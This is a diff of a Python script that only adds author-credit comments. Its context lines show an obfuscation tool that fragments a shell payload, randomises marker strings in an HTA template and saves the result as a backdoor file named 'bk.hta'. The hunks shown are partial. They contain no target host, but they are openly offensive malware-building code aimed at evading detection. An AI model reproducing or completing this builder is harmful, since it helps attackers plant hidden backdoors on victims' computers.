@@ -19,7 +19,7 @@ def wrap(s, w):
     fragFile.write(textwrap.fill(s, w))
 
 def obfASW(getFileWithoutNullT):
-      
+      #Coded By AbedAlqader Swedan
    time.sleep(2)
    randomNumber=random.randint(1,60)
    genStrOne=''.join(random.choice(string.ascii_letters) for x in range(randomNumber))
@@ -43,7 +43,7 @@ def retrunNulls(roundNThreeT):
    wrap(shellReady,10)
    time.sleep(4)
    buildFrag()
- #  time.sleep(4)
+ #  time.sleep(4)       #Coded By AbedAlqader Swedan
 
 def buildFrag():
    count=0
@@ -60,7 +60,7 @@ def buildFrag():
           var0=line
    time.sleep(10)
    ProcessCompleted(count)
-
+#Coded By AbedAlqader Swedan
 def ProcessCompleted(count):
    replaceHta = open("htafile.hta", "r")
    readHta=replaceHta.read()
@@ -76,7 +76,7 @@ def ProcessCompleted(count):
    roundNOneV=readHta.replace("one", genVarOne)
    roundNTwoV=roundNOneV.replace("Two", genVarOne)
 
-   
+   #Coded By AbedAlqader Swedan
    time.sleep(5)
    #print "Facebook"+dataFragsxxx
    #roundNThreeV=roundNTwoV.replace("Fa0CB0Ok",dataFragsxxx)
@@ -92,7 +92,7 @@ def ProcessCompleted(count):
    genVarOneStep=''.join(random.choice(string.ascii_letters) for x in range(randomNumberV))
    roundNOneS=roundNZeroV.replace("SRpT", genVarOneStep)
 
-   
+   #Coded By AbedAlqader Swedan
 
    randomNumberStep=random.randint(1,9)
    genVarOneStep2=''.join(random.choice(string.ascii_letters) for x in range(randomNumberV))
@@ -101,5 +101,5 @@ def ProcessCompleted(count):
    saveBackDoOr = open("bk.hta", "w")
    saveBackDoOr.write(roundNOneS2)
 
-
+#Coded By AbedAlqader Swedan
 decodbs64()
